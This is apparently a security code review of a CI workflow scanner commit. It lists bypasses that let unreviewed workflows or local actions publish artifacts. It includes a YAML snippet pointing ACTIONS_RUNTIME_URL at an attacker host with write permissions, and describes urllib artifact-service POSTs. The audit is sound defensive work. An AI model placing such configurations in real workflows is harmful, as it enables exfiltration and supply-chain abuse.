# Independent source review — `643b304a9fd011e016d32efa963fc3edfa8b2a7e`

**Bounded verdict: CHANGES REQUIRED.** The structural successor catches the previously demonstrated reachable Python and opaque-publisher edits, but the scanner still admits publisher capability through unreviewed workflow files/local actions, omits workflow-level capability keys, and proves only base/head equality rather than an independently trusted base contract. Generated drift remains unresolved. No G1, authority, or hostile-runtime approval.

## Frozen provenance

- Reviewed commit: `643b304a9fd011e016d32efa963fc3edfa8b2a7e`
- Parent: `e2124475806a042313fc5a4e251f88246a6d16ab`
- Branch/worktree: `codex/g1-bootstrap-isolation`, `/private/tmp/velnor-g1-bootstrap`
- Worktree was clean and matched `origin/codex/g1-bootstrap-isolation` at the review.
- `e212..643` changes only `src/s2/mod.rs` and `src/s2/policy/tests.rs`; no generated workflow is changed.
- No source, generated workflow, GitHub, publication, or installation state was changed. This report is the only external write.

## What the successor fixes

The new scanner requires non-local `uses:` values to match a full 40-hex revision (`src/s2/mod.rs:4676,4720-4725`), follows local reusable-workflow edges, requires the base/head reachable sets to match, and compares a whitespace-normalized capability list for every reachable workflow (`:4770-4818`). The committed tests now cover Python and opaque publisher edits in the root workflow (`src/s2/policy/tests.rs:801-819`).

Safe synthetic execution of the exact embedded scanner body against temporary workflow tar archives confirmed rejection (`rc=1`) for head-only changes adding:

- the Python `urllib` artifact-service POST;
- a pinned opaque third-party publisher action;
- a local action or local called-workflow edge;
- job-level `container`/`services` changes; and
- an existing action's `with` input change.

Those are real scanner results; no hostile binary, Docker, GitHub authority, or action runtime was executed.

## Blocking finding 1 — unreviewed workflow files and local-action source remain executable

**P1 — `src/s2/mod.rs:4652-4655,4700-4763,4796-4818`.** The source archive passed to this scanner contains only `.github/workflows` (`git archive ... .github/workflows`). The graph comparison visits only `base_reachable`, which starts at `.github/workflows/ci-pr.yml`; it never requires the full workflow-file set to equal the base and never includes the source of `./.github/actions/...` local actions.

Exact scanner-body repros:

| Head change, with root `ci-pr.yml` otherwise fixed | Result |
| --- | --- |
| Add unreachable `.github/workflows/evil.yml` with a Python `urllib` POST through `ACTIONS_RUNTIME_URL` | **accepted, `rc=0`** |
| Add unreachable `.github/workflows/evil.yml` with `attacker/publisher@<40-hex-SHA>` | **accepted, `rc=0`** |
| Keep an existing root `uses: ./.github/actions/publisher` line; change only `.github/actions/publisher/action.yml` from benign to an artifact-service POST | **accepted, `rc=0`** |

The first two files are not reachable from the root graph, so their capability lines are never compared. The opaque action passes the immutable-reference regex. The local action implementation is not in either archive at all. A same-repository PR can therefore add a separately triggered workflow or alter a referenced local action while the candidate namespace scan still reports one fixed uploader. This reopens the previous publisher boundary through a different path.

Required direction: bind the complete workflow/action execution closure, not only reachable workflow text. Reject any new workflow file or changed workflow outside the trusted owned set; include every local action/reusable-workflow file and its scripts in the base/head closure; and apply the closed action allowlist to all executable paths. A pinned third-party action is immutable, but a pin alone is not proof that an unreviewed workflow is allowed to publish the candidate namespace.

## Blocking finding 2 — capability normalization drops workflow-level keys

**P1 — `src/s2/mod.rs:4781-4794`.** `normalized_capability_contract()` ignores every line before the first `jobs:` line. Thus top-level `permissions`, `env`, `defaults`, `on`, `concurrency`, and `name` changes are outside the compared subset. Exact base-fixed/head-modified scanner runs accepted (`rc=0`) for each of:

```yaml
permissions:
  actions: write
env:
  ACTIONS_RUNTIME_URL: https://attacker.invalid/upload
defaults:
  run:
    shell: python
```

and separately for top-level `on`, `concurrency`, and `name` changes. The same omission applies to a reachable local reusable workflow: a top-level `permissions` change in `publish.yml` was accepted while its root call and all job lines remained equal.

The job-level cases are caught because their lines occur after `jobs:`; the workflow-level cases are not. Top-level permissions and environment/default shell configuration can change action credentials, runner command behavior, and inherited capability without changing the normalized job list. Fix by parsing and comparing the complete effective workflow capability (including workflow-level keys, anchors/aliases, defaults, permissions, environment, triggers, and action inputs), or by enforcing an exact trusted canonical workflow surface. Do not treat a jobs-only text slice as the capability contract.

## Blocking finding 3 — equality is not an independent trusted-base binding

**P1 — `src/s2/mod.rs:4939-4997,4802-4818`.** The acquire script checks that `HEAD_REPOSITORY` equals `GITHUB_REPOSITORY` and that both API commit/tree responses match the supplied `HEAD_SHA`/`BASE_SHA`; it then fetches both objects from `$HEAD_REPOSITORY` and obtains the comparison contract from `BASE_SHA`. The scanner has no independent expected hash/allowlist for the base workflow capability, no base-ref/default-branch/protected-ref check, and no proof that the base workflow/action closure is the trusted one. `BASE_REVISION` is carried into the handoff, but is not used by this scanner as a trusted capability anchor.

An exact same-archive malicious-base test was accepted (`rc=0`): base and head both contained the fixed candidate uploader plus the Python artifact-service publisher. The same result held for identical local-action and local-called-workflow publisher contracts. This is expected from equality, but it proves the scanner itself establishes only “head equals base,” not “base is trusted.” If the event's base ref/tree is not independently controller-verified and protected, a malicious base contract becomes the admitted contract for every head preserving it.

Required direction: establish the trusted base outside candidate-controlled workflow content (for example, verify the configured protected default ref and commit/tree through the controller's own API/object checks), bind the full trusted workflow/action closure or canonical capability digest to that result, and compare the head against that independent anchor. A head/base equality assertion alone is insufficient.

## Verification at exact `643b304`

- `rtk cargo test --locked -p velnor-workflow --lib s2::policy -- --nocapture`: **26 passed**.
- `rtk cargo test --locked -p velnor-workflow --test bootstrap_transport -- --test-threads=1`: **4 passed**.
- `rtk cargo clippy --locked -p velnor-workflow --all-targets --all-features -- -D warnings`: pass.
- `rtk cargo fmt --all -- --check`: pass.
- `rtk git diff --check e2124475806a042313fc5a4e251f88246a6d16ab..643b304a9fd011e016d32efa963fc3edfa8b2a7e`: pass.
- Focused generator fixed-point test: **0 passed, 1 failed** (`s2::tests::checked_in_workflows_match_the_generator_byte_for_byte`, `ci-policy.yml drifted from the generator`, `src/s2/mod.rs:17102`; 1700 tests filtered). No generated output was regenerated or waived.

No hostile probe, Docker execution, Mac-host runtime, hosted canary, real GitHub API/action archive, independent remote object proof, or authority action was performed. Resolve the three source findings and generated drift, regenerate from the admitted source, then re-freeze and rerun the full hosted/security gate.
